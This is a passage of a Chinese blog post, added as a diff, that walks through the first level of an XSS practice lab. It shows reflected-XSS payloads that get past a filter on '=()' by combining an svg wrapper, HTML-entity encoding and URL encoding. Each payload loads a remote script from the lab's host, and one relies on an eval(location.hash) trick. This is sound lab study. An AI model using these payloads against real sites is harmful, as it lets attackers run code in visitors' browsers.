@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶场链接：https:&#x2F;&#x2F;t.xcao.vip&#x2F; 第一式反射型XSS，过滤了 ( ) &#x3D; 1234567891011121314151617&lt;?php$data&#x3D;$_GET[&amp;#x27;data&amp;#x27;];$data &#x3D; str_replace(&quot;&#x3D;&quot;,&quot;&quot;,$data);$data &#x3D; str_replace(&quot;(&quot;,&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS初探-独孤九剑">
+<meta property="og:url" content="http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="靶场链接：https:&#x2F;&#x2F;t.xcao.vip&#x2F; 第一式反射型XSS，过滤了 ( ) &#x3D; 1234567891011121314151617&lt;?php$data&#x3D;$_GET[&amp;#x27;data&amp;#x27;];$data &#x3D; str_replace(&quot;&#x3D;&quot;,&quot;&quot;,$data);$data &#x3D; str_replace(&quot;(&quot;,&amp;quo">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-18T23:48:27.000Z">
+<meta property="article:modified_time" content="2022-03-22T09:41:28.728Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XSS初探-独孤九剑</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/03/17/XSS-%E5%88%9D%E6%8E%A2%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&text=XSS初探-独孤九剑"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&is_video=false&description=XSS初探-独孤九剑"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS初探-独孤九剑&body=Check out this article: http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&title=XSS初探-独孤九剑"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&name=XSS初探-独孤九剑&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/&t=XSS初探-独孤九剑"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">第一式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">参考：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">第二式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">第三式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A-1"><span class="toc-number">3.1.</span> <span class="toc-text">参考：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">第四式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1"><span class="toc-number">4.1.</span> <span class="toc-text">方法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2"><span class="toc-number">4.2.</span> <span class="toc-text">方法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-number">5.</span> <span class="toc-text">第五关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1-1"><span class="toc-number">5.1.</span> <span class="toc-text">方法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2-1"><span class="toc-number">5.2.</span> <span class="toc-text">方法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">6.</span> <span class="toc-text">第六关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1"><span class="toc-number">6.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2"><span class="toc-number">6.2.</span> <span class="toc-text">法 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-3"><span class="toc-number">6.3.</span> <span class="toc-text">法 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3"><span class="toc-number">7.</span> <span class="toc-text">第七关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1-1"><span class="toc-number">7.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2-1"><span class="toc-number">7.2.</span> <span class="toc-text">法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3"><span class="toc-number">8.</span> <span class="toc-text">第八关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1-2"><span class="toc-number">8.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2-2"><span class="toc-number">8.2.</span> <span class="toc-text">法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC8-1%E5%85%B3"><span class="toc-number">9.</span> <span class="toc-text">第8-1关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC8-2%E5%85%B3"><span class="toc-number">10.</span> <span class="toc-text">第8-2关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3"><span class="toc-number">11.</span> <span class="toc-text">第九关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">12.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        XSS初探-独孤九剑
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/03/19/XSS%E5%88%9D%E6%8E%A2-%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/" class="leancloud-visitors" data-flag-title="XSS初探-独孤九剑">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-18T23:48:27.000Z" itemprop="datePublished">2022-03-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>靶场链接：<a target="_blank" rel="noopener" href="https://t.xcao.vip/">https://t.xcao.vip/</a></p>
+<h2 id="第一式"><a href="#第一式" class="headerlink" title="第一式"></a>第一式</h2><p>反射型XSS，过滤了 <code>( ) =</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=$_GET[&#x27;data&#x27;];</span><br><span class="line">$data = str_replace(&quot;=&quot;,&quot;&quot;,$data);</span><br><span class="line">$data = str_replace(&quot;(&quot;,&quot;&quot;,$data);</span><br><span class="line">$data = str_replace(&quot;)&quot;,&quot;&quot;,$data);</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>独孤九剑-第一式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>过滤了 =()，少侠骨骼惊奇，必是练武奇才<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>要求加载任意 JS 代码,成功加载 http://xcao.vip/xss/alert.js 表示完成挑战<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php echo $data;?&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先是闭合标签，用 <code>&quot;&gt;</code> 闭合 input 标签，如<code>data=&quot;&gt;payload</code>，回显如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>独孤九剑-第一式  Design by 香草<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>过滤了 =()，少侠骨骼惊奇，必是练武奇才<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>要求加载任意JS代码,成功加载https://t.xcao.vip/xss/alert.js 表示完成挑战<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>payoad&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来考虑<code>&lt;svg&gt;</code>大法<br>构造如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">const</span> para = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">para.<span class="property">src</span>=<span class="string">&quot;https://xcao.vip/test/alert.js&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(para);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>由于<code>( ) = </code>被过滤，所以html实体字符编码，根据上篇博客，实体字符编码的目的就是使用上不方便使用的字符，所以编码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x20;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x45;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3B;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x3D;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x3A;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x6A;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x22;</span><span class="symbol">&amp;#x3B;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x6D;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x6F;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x79;</span><span class="symbol">&amp;#x2E;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x6E;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x68;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3B;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>可是 <code>#</code> 是url锚的的意思，不会被当作data的值，data值会在锚处截断。这时候就想到了，“编码是为了使用上使用不了的字符”，所以想到url编码。记得加上闭合标签，这里建议编码<code>&lt;script&gt;</code>内的内容，原因是<code>&lt;svg&gt;</code>标签内的内容解析类似于html解析，类似于建立dom树，所以<code>&lt;script&gt;</code>标签本身编码，则会出现错误</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">%26%23x63%3B%26%23x6F%3B%26%23x6E%3B%26%23x73%3B%26%23x74%3B%26%23x20%3B%26%23x70%3B%26%23x61%3B%26%23x72%3B%26%23x61%3B%26%23x20%3B%26%23x3D%3B%26%23x20%3B%26%23x64%3B%26%23x6F%3B%26%23x63%3B%26%23x75%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x63%3B%26%23x72%3B%26%23x65%3B%26%23x61%3B%26%23x74%3B%26%23x65%3B%26%23x45%3B%26%23x6C%3B%26%23x65%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x28%3B%26%23x22%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x22%3B%26%23x29%3B%26%23x3B%3B%0D%0A%26%23x70%3B%26%23x61%3B%26%23x72%3B%26%23x61%3B%26%23x2E%3B%26%23x73%3B%26%23x72%3B%26%23x63%3B%26%23x3D%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3A%3B%26%23x2F%3B%26%23x2F%3B%26%23x78%3B%26%23x63%3B%26%23x61%3B%26%23x6F%3B%26%23x2E%3B%26%23x76%3B%26%23x69%3B%26%23x70%3B%26%23x2F%3B%26%23x74%3B%26%23x65%3B%26%23x73%3B%26%23x74%3B%26%23x2F%3B%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x2E%3B%26%23x6A%3B%26%23x73%3B%26%23x22%3B%26%23x3B%3B%0D%0A%26%23x64%3B%26%23x6F%3B%26%23x63%3B%26%23x75%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x62%3B%26%23x6F%3B%26%23x64%3B%26%23x79%3B%26%23x2E%3B%26%23x61%3B%26%23x70%3B%26%23x70%3B%26%23x65%3B%26%23x6E%3B%26%23x64%3B%26%23x43%3B%26%23x68%3B%26%23x69%3B%26%23x6C%3B%26%23x64%3B%26%23x28%3B%26%23x70%3B%26%23x61%3B%26%23x72%3B%26%23x61%3B%26%23x29%3B%26%23x3B%3B</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>整体思路如此<code>svg --&gt; 实体编码 --&gt; url编码</code></p>
+<p>附上作者以及网上搜集的一些payload  </p>
+<p>靶场作者payload  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">最终 <span class="variable constant_">GET</span> <span class="variable constant_">DATA</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//xcao.vip/test/xss1.php?data=%22%3E%3Csvg%3E%3Cscript%3E%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x6c%3B%26%23x6f%3B%26%23x63%3B%26%23x61%3B%26%23x74%3B%26%23x69%3B%26%23x6f%3B%26%23x6e%3B%26%23x2e%3B%26%23x68%3B%26%23x61%3B%26%23x73%3B%26%23x68%3B%26%23x2e%3B%26%23x73%3B%26%23x6c%3B%26%23x69%3B%26%23x63%3B%26%23x65%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%26%23x29%3B%3C/script%3E%3C/svg%3E#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/test/alert.js&#x27;</span></span><br><span class="line"></span><br><span class="line">原始<span class="variable constant_">JS</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//xcao.vip/test/xss1.php?data=&quot;&gt;&lt;svg&gt;&lt;script&gt;eval(location.hash.slice(1))&lt;/script&gt;&lt;/svg&gt;#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/test/alert.js&#x27;</span></span><br><span class="line">其中   </span><br><span class="line">location.<span class="property">hash</span> 获取锚点    </span><br><span class="line">location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>) 返回第一个锚点，即 # 之后的<span class="variable constant_">JS</span>代码</span><br><span class="line">蛮巧妙的</span><br></pre></td></tr></table></figure>
+<p>一些其他payload，总之就是可以引用目标地址的 JS 代码就好</p>
